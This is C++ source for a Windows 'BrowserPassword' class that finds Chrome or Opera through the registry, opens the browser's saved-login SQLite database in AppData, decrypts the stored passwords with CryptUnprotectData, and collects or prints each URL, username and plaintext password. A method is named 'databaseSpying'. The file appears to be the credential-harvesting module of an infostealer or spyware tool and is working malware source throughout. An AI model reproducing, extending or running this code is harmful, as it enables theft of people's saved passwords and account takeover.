#include "stdafx.h"
#include "BrowserPassword.hh"

BrowserPassword::BrowserPassword()
{
	_type = BrowserType::CHROME;
	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::CHROME, _CHROME_REGKEY_PATH));
	_mapRegKeyPath.insert(std::pair<BrowserType, const wchar_t*>(BrowserType::OPERA, _OPERA_REGKEY_PATH));
	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::CHROME, _CHROME_DATABASE_PATH));
	_mapDatabasePath.insert(std::pair<BrowserType, const char*>(BrowserType::OPERA, _OPERA_DATABASE_PATH));
	findCurrentUserName();
}

BrowserPassword::~BrowserPassword()
{
}

void					BrowserPassword::findCurrentUserName()
{
	DWORD				len = UNLEN + 1;
	wchar_t				usernameUnicode[UNLEN + 1] = { 0 };
	char				usernameUtf[UNLEN + 1] = { 0 };

	GetUserName(usernameUnicode, &len);
	std::wcstombs(usernameUtf, usernameUnicode, sizeof(usernameUnicode));
	_userName.append(usernameUtf);
}

void					BrowserPassword::setBrowserType(const BrowserType &type)
{
	_type = type;
}

void					BrowserPassword::printPassword()
{
	std::vector<t_loginConnection>::iterator	it;

	it = _vectorLoginConnection.begin();
	while (it != _vectorLoginConnection.end())
	{
		std::cout << "Url: " << it->_url.c_str() << "\nUsername: " << it->_username.c_str() << "\nPassword: " << it->_password.c_str() << std::endl;
		++it;
	}
}

const std::vector<BrowserPassword::t_loginConnection>	&BrowserPassword::getBrowserInfo() const
{
	return (_vectorLoginConnection);
}

bool					BrowserPassword::passwordIsEmpty()
{
	return (_vectorLoginConnection.empty());
}

bool					BrowserPassword::findAppdataPath(std::string &appdataPath)
{
	char				utfPath[MAX_PATH] = { 0 };
	wchar_t				unicodePath[MAX_PATH] = { 0 };
	
	if (SUCCEEDED(SHGetFolderPath(NULL, (int)_type, NULL, 0, unicodePath)) == FALSE)
	{
		std::cerr << "[KO]\tError failed to find Appdata directory" << std::endl;
		return (false);
	}
	std::wcstombs(utfPath, unicodePath, sizeof(unicodePath));
	appdataPath.append(utfPath);
	return (true);
}

bool					BrowserPassword::isBrowserInstalled()
{
	HKEY				hkey = NULL;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _mapRegKeyPath[_type], 0, KEY_READ, &hkey) != ERROR_SUCCESS)
	{
		std::cerr << "[KO]\tBrowser is not installed" << std::endl;
		return (false);
	}
	RegCloseKey(hkey);
	return (true);
}

const char				*BrowserPassword::uncryptData(BYTE *password, int size)
{
	DATA_BLOB			in;
	DATA_BLOB			out;

	in.pbData = password;
	in.cbData = size + 1;
	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out))
	{
		out.pbData[out.cbData] = 0;
		return ((const char*)out.pbData);
	}
	return (_ERROR_UNCRYPT);
}

void					BrowserPassword::getBrowserPassword(sqlite3 *db)
{
	sqlite3_stmt		*stmt;
	t_loginConnection	login;

	std::cout << "[OK]\tDatabase found" << std::endl;
	if (sqlite3_prepare_v2(db, _GET_PASSWORD_QUERY, -1, &stmt, 0) == SQLITE_OK)
	{
		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			login._url.append((const char*)sqlite3_column_text(stmt, 0));
			login._username.append((const char*)sqlite3_column_text(stmt, 1));
			login._password.append(uncryptData((BYTE*)sqlite3_column_text(stmt, 3), sqlite3_column_int(stmt, 2)));
			_vectorLoginConnection.push_back(login);
		}
	}
	else
		std::cerr << "[KO]\tError preparing database" << std::endl;
	sqlite3_finalize(stmt);
	sqlite3_close(db);
}

void					BrowserPassword::databaseSpying()
{
	sqlite3				*db;
	std::string			databasePath;

	std::cout << "Looking for browser's passwords ..." << std::endl;
	if (isBrowserInstalled())
	{
		if (findAppdataPath(databasePath))
		{
			databasePath += _mapDatabasePath[_type];
			if (sqlite3_open(databasePath.c_str(), &db) == SQLITE_OK)
				getBrowserPassword(db);
			else
				std::cerr << "[KO]\tError opening database" << std::endl;
		}
	}
}
